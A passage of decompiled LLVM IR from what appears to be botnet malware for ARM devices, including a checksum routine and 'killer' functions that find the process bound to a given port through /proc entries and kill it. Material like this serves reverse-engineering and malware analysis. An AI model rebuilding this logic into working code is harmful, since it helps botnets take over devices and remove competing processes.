  %v1_de54 = phi i32 [ %v1_de2c, %.thread ], [ %v3_de2c, %bb ]
  %v0_de34 = mul i32 %v3_ddf8, 65536
  %v3_de34 = udiv i32 %v0_de34, 65536
  %v3_de38 = urem i32 %v3_ddfc, 65536
  %v4_de40 = udiv i32 %v3_ddf8, 65536
  %v2_de3c = add nuw nsw i32 %v3_de38, %v4_de40
  %v5_de40 = add nuw nsw i32 %v2_de3c, %v3_de34
  %v1_de44 = add i32 %arg1, 9
  %v2_de44 = inttoptr i32 %v1_de44 to i8*
  %v3_de44 = load i8, i8* %v2_de44, align 1
  %v4_de44 = zext i8 %v3_de44 to i32
  %v4_de48 = udiv i32 %v3_ddfc, 65536
  %v3_de50 = mul nuw nsw i32 %v4_de44, 256
  %v5_de48 = add i32 %v4_de48, %arg2
  %v2_de4c = add i32 %v5_de48, %v1_de54
  %v2_de54 = add i32 %v2_de4c, %v5_de40
  %v2_de58 = add i32 %v2_de54, %v3_de50
  %tmp = icmp ult i32 %v2_de58, 65536
  br i1 %tmp, label %dec_label_pc_de78, label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %bb19, %dec_label_pc_de64
  %v2_de6c5 = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706.in = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706 = udiv i32 %v3_de706.in, 65536
  %v3_de68 = urem i32 %v2_de6c5, 65536
  %v2_de6c = add nuw nsw i32 %v3_de68, %v3_de706
  %tmp20 = icmp ult i32 %v2_de6c, 65536
  br i1 %tmp20, label %dec_label_pc_de78.loopexit, label %dec_label_pc_de64

dec_label_pc_de78.loopexit:                       ; preds = %dec_label_pc_de64
  br label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de78.loopexit, %bb19
  %v0_de78 = phi i32 [ %v2_de6c, %dec_label_pc_de78.loopexit ], [ %v2_de58, %bb19 ]
  %v1_de78 = urem i32 %v0_de78, 65536
  %v3_de80 = xor i32 %v1_de78, 65535
  ret i32 %v3_de80

; uselistorder directives
  uselistorder i32 %v2_de6c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_de58, { 3, 0, 2, 1 }
  uselistorder i32 %v1_de2c, { 1, 0 }
  uselistorder i32 %v5_de10, { 1, 0 }
  uselistorder i32 %v0_de10, { 1, 0 }
  uselistorder i32 %v3_ddf8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_de64, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_de0c, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_de98 = load i32, i32* @global_var_24648.102, align 4
  %v2_dea0 = call i32 @kill(i32 %v2_de98, i32 9)
  ret i32 %v2_dea0
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_deb4 = load i32, i32* @r4, align 4
  %v6_deb4 = load i32, i32* @r5, align 4
  %v9_deb4 = load i32, i32* @r6, align 4
  %v12_deb4 = load i32, i32* @r7, align 4
  %v15_deb4 = load i32, i32* @r8, align 4
  %v18_deb4 = load i32, i32* @sb, align 4
  %v21_deb4 = load i32, i32* @sl, align 4
  %v24_deb4 = load i32, i32* @fp, align 4
  %v27_deb4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_ded0 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_ded0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_defc = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_defc, i32* @fp, align 4
  %v4_df08 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_df0c = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_df0c, i32* @sl, align 4
  %v0_df10 = load i32, i32* @r5, align 4
  %v3_df1c = bitcast i32* %stack_var_-8777 to i8*
  %v4_df1c = call i32 @__GI_memset(i8* %v3_df1c, i32 %v0_df10, i32 4096)
  %v0_df24 = load i32, i32* @r5, align 4
  %v3_df30 = bitcast i32* %stack_var_-4681 to i8*
  %v4_df30 = call i32 @__GI_memset(i8* %v3_df30, i32 %v0_df24, i32 4096)
  %v2_df34 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_df34, i32* @sb, align 4
  %v0_df38 = load i32, i32* %r4.global-to-local, align 4
  %v3_df38 = udiv i32 %v0_df38, 256
  %v1_df3c = urem i32 %v0_df38, 256
  store i32 %v1_df3c, i32* @r4, align 4
  %v3_df4c = trunc i32 %v3_df38 to i8
  %v4_df4c = call i32 @util_itoa(i8 %v3_df4c, i32 16, i32 %v2_df34)
  %v2_df54 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_df58 = icmp eq i32 %v2_df54, 2
  br i1 %v7_df58, label %dec_label_pc_e404, label %dec_label_pc_df60

dec_label_pc_df60:                                ; preds = %entry, %dec_label_pc_e404
  %v1_df64 = call i32 @table_unlock_val(i32 4)
  %v1_df6c = call i32 @table_unlock_val(i32 5)
  %v1_df74 = call i32 @table_unlock_val(i32 6)
  %v1_df7c = call i32 @table_unlock_val(i32 7)
  %v0_df80 = load i32, i32* @r5, align 4
  %v2_df88 = inttoptr i32 %v0_df80 to i32*
  %v3_df88 = call i32 @table_retrieve_val(i32 7, i32* %v2_df88)
  %v0_df8c = load i32, i32* @r5, align 4
  %v2_df90 = inttoptr i32 %v0_df8c to i16*
  %v3_df90 = call i32 @__libc_open(i32 %v3_df88, i16* %v2_df90)
  %v7_df94 = icmp eq i32 %v3_df90, -1
  store i32 %v3_df90, i32* @r8, align 4
  br i1 %v7_df94, label %bb, label %dec_label_pc_dfa4.preheader

bb:                                               ; preds = %dec_label_pc_df60
  %v1_df9c = load i32, i32* @r5, align 4
  store i32 %v1_df9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_dfa4.preheader:                      ; preds = %dec_label_pc_df60
  %v4_dfb057 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v3_df90)
  %v2_dfb459 = icmp eq i32 %v4_dfb057, 0
  br i1 %v2_dfb459, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc.lr.ph

dec_label_pc_dfbc.lr.ph:                          ; preds = %dec_label_pc_dfa4.preheader
  %v2_e004 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfbc.lr.ph, %dec_label_pc_dfa4.backedge
  %v3_dfc0 = load i8, i8* %stack_var_-585, align 1
  %v4_dfc0 = sext i8 %v3_dfc0 to i32
  store i32 %v4_dfc0, i32* @r3, align 4
  %v2_dfc4 = icmp eq i8 %v3_dfc0, 0
  br i1 %v2_dfc4, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_dfbc
  %v8_dfc8 = icmp eq i8 %v3_dfc0, 58
  br i1 %v8_dfc8, label %.thread8, label %dec_label_pc_dfdc

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_dff4

bb134:                                            ; preds = %dec_label_pc_dfbc
  br label %dec_label_pc_dff4

dec_label_pc_dfdc:                                ; preds = %bb133
  %v1_dfe4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb135, %dec_label_pc_dfdc
  %v0_dfe0 = phi i32 [ %v1_dfe0, %bb135 ], [ 0, %dec_label_pc_dfdc ]
  %v1_dfe0 = add i32 %v0_dfe0, 1
  %v2_dfe4 = add i32 %v1_dfe0, %v1_dfe4.pre
  %v3_dfe4 = inttoptr i32 %v2_dfe4 to i8*
  %v4_dfe4 = load i8, i8* %v3_dfe4, align 1
  %v6_dfe4 = zext i8 %v4_dfe4 to i32
  store i32 %v6_dfe4, i32* @r3, align 4
  %v2_dfe8 = icmp eq i8 %v4_dfe4, 0
  br i1 %v2_dfe8, label %dec_label_pc_dff4, label %bb135

bb135:                                            ; preds = %dec_label_pc_dfe0
  %v8_dfec = icmp eq i8 %v4_dfe4, 58
  br i1 %v8_dfec, label %dec_label_pc_dff4, label %dec_label_pc_dfe0

dec_label_pc_dff4:                                ; preds = %dec_label_pc_dfe0, %bb135, %bb134, %.thread8
  %v1_e020 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_dfe0, %bb135 ], [ %v1_dfe0, %dec_label_pc_dfe0 ]
  %v0_dff4 = phi i32 [ %v4_dfc0, %.thread8 ], [ %v4_dfc0, %bb134 ], [ %v6_dfe4, %bb135 ], [ %v6_dfe4, %dec_label_pc_dfe0 ]
  %v2_dff4 = icmp eq i32 %v0_dff4, 0
  br i1 %v2_dff4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_dffc

dec_label_pc_dfa4.backedge:                       ; preds = %dec_label_pc_dff4, %dec_label_pc_e0c4, %dec_label_pc_e110, %dec_label_pc_e040
  %v0_dfac = load i32, i32* @r8, align 4
  %v4_dfb0 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dfac)
  %v2_dfb4 = icmp eq i32 %v4_dfb0, 0
  br i1 %v2_dfb4, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc

dec_label_pc_dffc:                                ; preds = %dec_label_pc_dff4
  %v1_e000 = add i32 %v1_e020, 2
  %v2_e008 = add i32 %v1_e000, %v2_e004
  %v1_e00c = add i32 %v2_e008, -545
  %v2_e00c = inttoptr i32 %v1_e00c to i8*
  %v3_e00c = load i8, i8* %v2_e00c, align 1
  %v2_e010 = icmp eq i8 %v3_e00c, 0
  br i1 %v2_e010, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_dffc
  %v8_e014 = icmp eq i8 %v3_e00c, 32
  br i1 %v8_e014, label %.thread13, label %dec_label_pc_e020

.thread13:                                        ; preds = %bb136
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

bb137:                                            ; preds = %dec_label_pc_dffc
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

dec_label_pc_e020:                                ; preds = %bb136
  %v0_e020 = load i32, i32* @r6, align 4
  %v2_e020 = add i32 %v0_e020, %v1_e020
  br label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %bb138, %dec_label_pc_e020
  %v0_e03416 = phi i32 [ %v1_e034, %bb138 ], [ %v1_e000, %dec_label_pc_e020 ]
  %v0_e03818 = phi i32 [ %v1_e038, %bb138 ], [ %v2_e020, %dec_label_pc_e020 ]
  %v1_e028 = add i32 %v0_e03818, 3
  %v2_e028 = inttoptr i32 %v1_e028 to i8*
  %v3_e028 = load i8, i8* %v2_e028, align 1
  %v2_e02c = icmp eq i8 %v3_e028, 0
  br i1 %v2_e02c, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_e028
  %v1_e03417 = add i32 %v0_e03416, 1
  store i32 %v1_e03417, i32* @r5, align 4
  br label %dec_label_pc_e040

bb138:                                            ; preds = %dec_label_pc_e028
  %v8_e030 = icmp eq i8 %v3_e028, 32
  %v1_e034 = add i32 %v0_e03416, 1
  store i32 %v1_e034, i32* @r5, align 4
  %v1_e038 = add i32 %v0_e03818, 1
  br i1 %v8_e030, label %dec_label_pc_e040, label %dec_label_pc_e028

dec_label_pc_e040:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_e04c = phi i32 [ %v1_e03417, %.thread15 ], [ %v1_e000, %.thread13 ], [ %v1_e000, %bb137 ], [ %v1_e034, %bb138 ]
  %v0_e040 = load i32, i32* @r6, align 4
  %v2_e040 = add i32 %v0_e040, %v1_e000
  store i32 %v2_e040, i32* @r4, align 4
  %v2_e04c = add i32 %v1_e04c, %v2_e004
  store i32 0, i32* @r7, align 4
  %v3_e054 = add i32 %v2_e04c, -545
  %v4_e054 = inttoptr i32 %v3_e054 to i8*
  store i8 0, i8* %v4_e054, align 1
  %v0_e058 = load i32, i32* @r4, align 4
  %v1_e05c = inttoptr i32 %v0_e058 to i8*
  %v2_e05c = call i32 @util_strlen(i8* %v1_e05c)
  store i32 %v2_e05c, i32* @r1, align 4
  %v0_e068 = load i32, i32* @r4, align 4
  %v3_e06c = inttoptr i32 %v0_e068 to i8*
  %v4_e06c = call i32 @util_stristr(i8* %v3_e06c, i32 %v2_e05c, i32 %v2_df34)
  %v7_e070 = icmp eq i32 %v4_e06c, -1
  br i1 %v7_e070, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e08c.preheader

dec_label_pc_e08c.preheader:                      ; preds = %dec_label_pc_e040
  %v1_e074 = load i32, i32* @r7, align 4
  %v1_e078 = load i32, i32* @r6, align 4
  %v2_e078 = load i32, i32* @r5, align 4
  %v3_e078 = add i32 %v2_e078, %v1_e078
  store i32 %v1_e074, i32* @lr, align 4
  %v1_e08c49 = add i32 %v3_e078, 2
  %v2_e08c50 = inttoptr i32 %v1_e08c49 to i8*
  %v3_e08c51 = load i8, i8* %v2_e08c50, align 1
  %v4_e08c52 = zext i8 %v3_e08c51 to i32
  store i32 %v4_e08c52, i32* @r3, align 4
  %v2_e09053 = icmp eq i8 %v3_e08c51, 0
  %v1_e09455 = add i32 %v2_e078, 2
  br i1 %v2_e09053, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %dec_label_pc_e08c.preheader, %dec_label_pc_e08c.backedge
  %v0_e0c484 = phi i32 [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e0ac.pr = phi i32 [ %v0_e0ac.pr71, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e3d8 = phi i32 [ %v0_e3d874, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e09479 = phi i32 [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v1_e09455, %dec_label_pc_e08c.preheader ]
  %v0_e0bc = phi i32 [ %v0_e08c, %dec_label_pc_e08c.backedge ], [ %v3_e078, %dec_label_pc_e08c.preheader ]
  %v1_e0a0 = phi i32 [ %v4_e08c, %dec_label_pc_e08c.backedge ], [ %v4_e08c52, %dec_label_pc_e08c.preheader ]
  %v7_e09c = icmp eq i32 %v1_e0a0, 9
  br i1 %v7_e09c, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_e09c
  %v8_e0a0 = icmp eq i32 %v1_e0a0, 32
  br i1 %v8_e0a0, label %.thread27, label %dec_label_pc_e0ac

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_e0b8

bb140:                                            ; preds = %dec_label_pc_e09c
  br label %dec_label_pc_e0b8

dec_label_pc_e0ac:                                ; preds = %bb139
  %v7_e0ac = icmp eq i32 %v0_e0ac.pr, 1
  br i1 %v7_e0ac, label %dec_label_pc_e3d8, label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e3d8, %dec_label_pc_e0ac
  %v0_e0b876 = phi i32 [ %v1_e3d8, %dec_label_pc_e3d8 ], [ %v0_e3d8, %dec_label_pc_e0ac ]
  br label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %bb140, %.thread27, %dec_label_pc_e0b4
  %v0_e0b8 = phi i32 [ %v0_e3d8, %.thread27 ], [ %v0_e3d8, %bb140 ], [ %v0_e0b876, %dec_label_pc_e0b4 ]
  %v0_e0ac.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_e0b4 ]
  %v7_e0c0 = icmp sgt i32 %v0_e0b8, 6
  br i1 %v7_e0c0, label %dec_label_pc_e0c4, label %dec_label_pc_e08c.backedge

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e08c.backedge, %dec_label_pc_e0b8, %dec_label_pc_e08c.preheader
  %v1_e114 = phi i32 [ %v1_e09455, %dec_label_pc_e08c.preheader ], [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v0_e09479, %dec_label_pc_e0b8 ]
  %v0_e0c4 = phi i32 [ %v1_e074, %dec_label_pc_e08c.preheader ], [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v2_e0c4 = icmp eq i32 %v0_e0c4, 0
  br i1 %v2_e0c4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v2_e0d8 = add i32 %v1_e114, %v2_e004
  %v1_e0dc = add i32 %v2_e0d8, -545
  %v2_e0dc = inttoptr i32 %v1_e0dc to i8*
  %v3_e0dc = load i8, i8* %v2_e0dc, align 1
  %v2_e0e0 = icmp eq i8 %v3_e0dc, 0
  br i1 %v2_e0e0, label %dec_label_pc_e110, label %bb141

bb141:                                            ; preds = %dec_label_pc_e0d0
  %v8_e0e4 = icmp eq i8 %v3_e0dc, 32
  br i1 %v8_e0e4, label %dec_label_pc_e110, label %dec_label_pc_e0ec

dec_label_pc_e0ec:                                ; preds = %bb141
  %v2_e0ec = add i32 %v1_e114, %v1_e078
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %bb142, %dec_label_pc_e0ec
  %v0_e0fc30 = phi i32 [ %v1_e0fc, %bb142 ], [ %v1_e114, %dec_label_pc_e0ec ]
  %v0_e0f0 = phi i32 [ %v1_e0f0, %bb142 ], [ %v2_e0ec, %dec_label_pc_e0ec ]
  %v1_e0f0 = add i32 %v0_e0f0, 1
  %v2_e0f0 = inttoptr i32 %v1_e0f0 to i8*
  %v3_e0f0 = load i8, i8* %v2_e0f0, align 1
  %v2_e0f4 = icmp eq i8 %v3_e0f0, 0
  br i1 %v2_e0f4, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_e0f0
  %v1_e0fc31 = add i32 %v0_e0fc30, 1
  br label %dec_label_pc_e104

bb142:                                            ; preds = %dec_label_pc_e0f0
  %v8_e0f8 = icmp eq i8 %v3_e0f0, 32
  %v1_e0fc = add i32 %v0_e0fc30, 1
  br i1 %v8_e0f8, label %dec_label_pc_e104, label %dec_label_pc_e0f0

dec_label_pc_e104:                                ; preds = %bb142, %.thread29
  %v1_e10c = phi i32 [ %v1_e0fc31, %.thread29 ], [ %v1_e0fc, %bb142 ]
  %v2_e10c = add i32 %v1_e10c, %v2_e004
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e0d0, %bb141, %dec_label_pc_e104
  %v2_e11c = phi i32 [ %v2_e0d8, %dec_label_pc_e0d0 ], [ %v2_e0d8, %bb141 ], [ %v2_e10c, %dec_label_pc_e104 ]
  %v2_e114 = add i32 %v1_e114, %v1_e078
  store i32 %v2_e114, i32* @r4, align 4
  %v3_e11c = add i32 %v2_e11c, -545
  %v4_e11c = inttoptr i32 %v3_e11c to i8*
  store i8 0, i8* %v4_e11c, align 1
  %v1_e120 = inttoptr i32 %v2_e114 to i8*
  %v2_e120 = call i32 @util_strlen(i8* %v1_e120)
  %v8_e128 = icmp sgt i32 %v2_e120, 15
  br i1 %v8_e128, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e12c

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e110
  %v0_e130 = load i32, i32* @r4, align 4
  %v2_e134 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e134, i32* @r0, align 4
  %v2_e138 = bitcast i32* %stack_var_-56 to i8*
  %v3_e138 = call i32 @util_strcpy(i8* %v2_e138, i32 %v0_e130)
  br label %dec_label_pc_e13c

dec_label_pc_e13c.loopexit:                       ; preds = %dec_label_pc_dfa4.backedge, %dec_label_pc_dfa4.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e13c.loopexit, %dec_label_pc_e12c
  %v1_e14c.pre-phi = phi i8* [ %.pre100, %dec_label_pc_e13c.loopexit ], [ %v2_e138, %dec_label_pc_e12c ]
  %v2_e148.pre-phi = phi i32 [ %.pre, %dec_label_pc_e13c.loopexit ], [ %v2_e134, %dec_label_pc_e12c ]
  %v0_e13c = load i32, i32* @r8, align 4
  %v1_e140 = call i32 @__GI___libc_close(i32 %v0_e13c)
  %v2_e14c = call i32 @util_strlen(i8* %v1_e14c.pre-phi)
  store i32 %v2_e14c, i32* @r4, align 4
  %v2_e150 = icmp eq i32 %v2_e14c, 0
  br i1 %v2_e150, label %dec_label_pc_e3a8, label %dec_label_pc_e15c

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e13c
  %v3_e164 = call i32 @table_retrieve_val(i32 4, i32* null)
  %v1_e168 = call i32 @__GI_opendir(i32 %v3_e164)
  store i32 %v1_e168, i32* @sb, align 4
  %v2_e16c = icmp eq i32 %v1_e168, 0
  br i1 %v2_e16c, label %dec_label_pc_e39c, label %dec_label_pc_e17c.preheader

dec_label_pc_e17c.preheader:                      ; preds = %dec_label_pc_e15c
  store i32 0, i32* @r5, align 4
  %v1_e18044 = inttoptr i32 %v1_e168 to i32*
  %v2_e18045 = call i32 @__GI_readdir(i32* %v1_e18044)
  %v2_e18447 = icmp eq i32 %v2_e18045, 0
  br i1 %v2_e18447, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e17c.loopexit:                       ; preds = %dec_label_pc_e194, %dec_label_pc_e1a4, %dec_label_pc_e210
  %v0_e17c = load i32, i32* @sb, align 4
  %v1_e180 = inttoptr i32 %v0_e17c to i32*
  %v2_e180 = call i32 @__GI_readdir(i32* %v1_e180)
  %v2_e184 = icmp eq i32 %v2_e180, 0
  br i1 %v2_e184, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e18c.preheader:                      ; preds = %dec_label_pc_e17c.preheader, %dec_label_pc_e17c.loopexit
  %v0_e19492 = phi i32 [ %v2_e180, %dec_label_pc_e17c.loopexit ], [ %v2_e18045, %dec_label_pc_e17c.preheader ]
  br label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e18c.preheader, %dec_label_pc_e378
  %v0_e1ac = phi i32 [ %v0_e19492, %dec_label_pc_e18c.preheader ], [ %v2_e384, %dec_label_pc_e378 ]
  %v0_e18c = load i32, i32* @r5, align 4
  %v2_e18c = icmp eq i32 %v0_e18c, 0
  br i1 %v2_e18c, label %dec_label_pc_e194, label %dec_label_pc_e390

dec_label_pc_e194:                                ; preds = %dec_label_pc_e18c
  %v1_e194 = add i32 %v0_e1ac, 11
  %v2_e194 = inttoptr i32 %v1_e194 to i8*
  %v3_e194 = load i8, i8* %v2_e194, align 1
  %v4_e194 = zext i8 %v3_e194 to i32
  %v1_e198 = add nsw i32 %v4_e194, -48
  %tmp = icmp ugt i32 %v1_e198, 9
  br i1 %tmp, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e194
  store i32 %v1_e194, i32* @r7, align 4
  %v3_e1b0 = call i32 @table_retrieve_val(i32 4, i32* null)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e1bc = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e1b0)
  %v2_e1c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1c8 = load i32, i32* @r7, align 4
  %v1_e1cc = load i32, i32* @sl, align 4
  %v2_e1cc = add i32 %v1_e1cc, %v2_e1c4
  store i32 %v2_e1cc, i32* @r0, align 4
  %v2_e1d0 = inttoptr i32 %v2_e1cc to i8*
  %v3_e1d0 = call i32 @util_strcpy(i8* %v2_e1d0, i32 %v0_e1c8)
  %v2_e1d8 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1dc = load i32, i32* @r5, align 4
  store i32 %v2_e1d8, i32* @r4, align 4
  %v2_e1e8 = inttoptr i32 %v0_e1dc to i32*
  %v3_e1e8 = call i32 @table_retrieve_val(i32 5, i32* %v2_e1e8)
  %v0_e1f0 = load i32, i32* @r4, align 4
  %v1_e1f0 = load i32, i32* @sl, align 4
  %v2_e1f0 = add i32 %v1_e1f0, %v0_e1f0
  store i32 %v2_e1f0, i32* @r0, align 4
  %v2_e1f4 = inttoptr i32 %v2_e1f0 to i8*
  %v3_e1f4 = call i32 @util_strcpy(i8* %v2_e1f4, i32 %v3_e1e8)
  %v3_e204 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e208 = icmp eq i32 %v3_e204, -1
  br i1 %v7_e208, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e1a4
  %v0_e210 = load i32, i32* @r5, align 4
  %v2_e218 = inttoptr i32 %v0_e210 to i32*
  %v3_e218 = call i32 @table_retrieve_val(i32 4, i32* %v2_e218)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e224 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e218)
  %v2_e22c = call i32 @util_strlen(i8* %v3_df30)
  %v0_e230 = load i32, i32* @r7, align 4
  %v1_e234 = load i32, i32* @sl, align 4
  %v2_e234 = add i32 %v1_e234, %v2_e22c
  store i32 %v2_e234, i32* @r0, align 4
  %v2_e238 = inttoptr i32 %v2_e234 to i8*
  %v3_e238 = call i32 @util_strcpy(i8* %v2_e238, i32 %v0_e230)
  %v2_e240 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e244 = load i32, i32* @r5, align 4
  store i32 %v2_e240, i32* @r4, align 4
  %v2_e250 = inttoptr i32 %v0_e244 to i32*
  %v3_e250 = call i32 @table_retrieve_val(i32 6, i32* %v2_e250)
  %v0_e258 = load i32, i32* @r4, align 4
  %v1_e258 = load i32, i32* @sl, align 4
  %v2_e258 = add i32 %v1_e258, %v0_e258
  store i32 %v2_e258, i32* @r0, align 4
  %v2_e25c = inttoptr i32 %v2_e258 to i8*
  %v3_e25c = call i32 @util_strcpy(i8* %v2_e25c, i32 %v3_e250)
  %v1_e264 = call i32 @__GI_opendir(i32 %v2_df0c)
  store i32 %v1_e264, i32* @r8, align 4
  %v2_e268 = icmp eq i32 %v1_e264, 0
  br i1 %v2_e268, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e270.preheader

dec_label_pc_e270.preheader:                      ; preds = %dec_label_pc_e210
  %v1_e27439 = inttoptr i32 %v1_e264 to i32*
  %v2_e27440 = call i32 @__GI_readdir(i32* %v1_e27439)
  store i32 %v2_e27440, i32* @r6, align 4
  %v2_e27842 = icmp eq i32 %v2_e27440, 0
  br i1 %v2_e27842, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e270.loopexit:                       ; preds = %dec_label_pc_e290, %dec_label_pc_e328
  %v0_e270 = load i32, i32* @r8, align 4
  %v1_e274 = inttoptr i32 %v0_e270 to i32*
  %v2_e274 = call i32 @__GI_readdir(i32* %v1_e274)
  store i32 %v2_e274, i32* @r6, align 4
  %v2_e278 = icmp eq i32 %v2_e274, 0
  br i1 %v2_e278, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e288thread-pre-split:                ; preds = %dec_label_pc_e270.preheader, %dec_label_pc_e270.loopexit
  %v0_e288.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e288

dec_label_pc_e288:                                ; preds = %dec_label_pc_e288thread-pre-split, %dec_label_pc_e350
  %v0_e288 = phi i32 [ %v0_e288.pr, %dec_label_pc_e288thread-pre-split ], [ 1, %dec_label_pc_e350 ]
  %v2_e288 = icmp eq i32 %v0_e288, 0
  br i1 %v2_e288, label %dec_label_pc_e290, label %dec_label_pc_e378

dec_label_pc_e290:                                ; preds = %dec_label_pc_e288
  %v2_e290 = call i32 @util_zero(i32 %v2_defc, i32 4096)
  %v0_e294 = load i32, i32* @r5, align 4
  %v2_e29c = inttoptr i32 %v0_e294 to i32*
  %v3_e29c = call i32 @table_retrieve_val(i32 4, i32* %v2_e29c)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e2a8 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e29c)
  %v2_e2b0 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2b4 = load i32, i32* @r7, align 4
  %v1_e2b8 = load i32, i32* @sl, align 4
  %v2_e2b8 = add i32 %v1_e2b8, %v2_e2b0
  store i32 %v2_e2b8, i32* @r0, align 4
  %v2_e2bc = inttoptr i32 %v2_e2b8 to i8*
  %v3_e2bc = call i32 @util_strcpy(i8* %v2_e2bc, i32 %v0_e2b4)
  %v2_e2c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2c8 = load i32, i32* @r5, align 4
  store i32 %v2_e2c4, i32* @r4, align 4
  %v2_e2d4 = inttoptr i32 %v0_e2c8 to i32*
  %v3_e2d4 = call i32 @table_retrieve_val(i32 6, i32* %v2_e2d4)
  %v0_e2dc = load i32, i32* @r4, align 4
  %v1_e2dc = load i32, i32* @sl, align 4
  %v2_e2dc = add i32 %v1_e2dc, %v0_e2dc
  store i32 %v2_e2dc, i32* @r0, align 4
  %v2_e2e0 = inttoptr i32 %v2_e2dc to i8*
